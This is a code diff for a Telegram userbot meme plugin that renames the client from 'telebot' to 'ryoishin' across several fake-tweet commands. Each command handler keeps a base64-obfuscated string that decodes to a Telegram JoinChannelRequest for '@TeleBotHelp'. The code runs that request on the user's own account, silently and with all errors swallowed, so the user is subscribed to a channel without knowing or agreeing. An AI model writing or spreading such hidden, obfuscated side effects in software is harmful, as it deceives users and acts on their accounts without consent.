@@ -11,7 +11,7 @@ import requests
 from PIL import Image
 from validators.url import url
 
-from telebot import CMD_HELP
+from ryoishin import CMD_HELP
 
 EMOJI_PATTERN = re.compile(
     "["
@@ -110,8 +110,8 @@ async def tweets(text1, text2):
     return "temp.jpg"
 
 
-@telebot.on(admin_cmd(pattern="trump(?: |$)(.*)", outgoing=True))
-@telebot.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
+@ryoishin.on(admin_cmd(pattern="trump(?: |$)(.*)", outgoing=True))
+@ryoishin.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -132,7 +132,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await ryoishin(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -141,8 +141,8 @@ async def nekobot(event):
     await event.delete()
 
 
-@telebot.on(admin_cmd(pattern="modi(?: |$)(.*)", outgoing=True))
-@telebot.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
+@ryoishin.on(admin_cmd(pattern="modi(?: |$)(.*)", outgoing=True))
+@ryoishin.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -163,7 +163,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await ryoishin(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -172,8 +172,8 @@ async def nekobot(event):
     await event.delete()
 
 
-@telebot.on(admin_cmd(pattern="cmm(?: |$)(.*)", outgoing=True))
-@telebot.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
+@ryoishin.on(admin_cmd(pattern="cmm(?: |$)(.*)", outgoing=True))
+@ryoishin.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -194,7 +194,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await ryoishin(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -203,8 +203,8 @@ async def nekobot(event):
     await event.delete()
 
 
-@telebot.on(admin_cmd(pattern="kanna(?: |$)(.*)", outgoing=True))
-@telebot.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
+@ryoishin.on(admin_cmd(pattern="kanna(?: |$)(.*)", outgoing=True))
+@ryoishin.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -225,7 +225,7 @@ async def nekobot(event):
         isee = str(
             pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await telebot(isee)
+        await ryoishin(isee)
     except BaseException:
         pass
     text = deEmojify(text)
